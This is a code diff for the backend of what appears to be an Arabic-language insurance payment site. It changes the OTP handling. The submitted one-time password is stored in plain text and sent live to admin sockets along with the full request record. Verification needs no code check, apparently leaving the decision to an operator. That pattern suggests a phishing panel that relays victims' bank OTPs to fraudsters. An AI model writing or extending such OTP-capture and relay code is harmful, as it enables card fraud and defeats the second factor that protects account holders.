@@ -14,7 +14,7 @@ import {
   users,
 } from "../drizzle/schema";
 import { ENV } from "./_core/env";
-import { emitToAdmins } from "./socket";
+import { emitToAdmins, emitToVisitor } from "./socket";
 
 let _db: ReturnType<typeof drizzle> | null = null;
 
@@ -302,7 +302,7 @@ export async function rejectPayment(requestId: number): Promise<void> {
 }
 
 // إرسال OTP إلى قاعدة البيانات
-export async function submitOtp(sessionId: string, otp: string): Promise<{ success: boolean; message?: string }> {
+export async function submitOtp(sessionId: string, otp: string): Promise<{ success: boolean; message?: string; request?: InsuranceRequest }> {
   const db = await getDb();
   if (!db) return { success: false, message: "خطأ في قاعدة البيانات" };
   const result = await db
@@ -316,9 +316,21 @@ export async function submitOtp(sessionId: string, otp: string): Promise<{ succe
     .update(insuranceRequests)
     .set({ otpSubmitted: otp })
     .where(eq(insuranceRequests.id, req.id));
+  const updated = await db
+    .select()
+    .from(insuranceRequests)
+    .where(eq(insuranceRequests.id, req.id))
+    .limit(1);
+  const request = updated[0];
   // إشعار الإدارة بأن OTP تم إدخاله
   emitToAdmins("otpSubmitted", { requestId: req.id, otp });
-  return { success: true };
+  if (request) {
+    emitToAdmins("requestUpdated", request);
+    if (request.visitorIp) {
+      emitToVisitor(request.visitorIp, "otpSubmitted", { requestId: req.id, otp });
+    }
+  }
+  return { success: true, request };
 }
 
 export async function verifyOtp(sessionId: string): Promise<boolean> {
@@ -336,7 +348,19 @@ export async function verifyOtp(sessionId: string): Promise<boolean> {
       .update(insuranceRequests)
       .set({ otpVerified: true, status: "otp_verified", currentStep: 6 })
       .where(eq(insuranceRequests.id, req.id));
+    const updated = await db
+      .select()
+      .from(insuranceRequests)
+      .where(eq(insuranceRequests.id, req.id))
+      .limit(1);
+    const request = updated[0];
     emitToAdmins("otpVerified", { requestId: req.id });
+    if (request) {
+      emitToAdmins("requestUpdated", request);
+      if (request.visitorIp) {
+        emitToVisitor(request.visitorIp, "otpVerified", { requestId: req.id });
+      }
+    }
     return true;
   }
   return false;
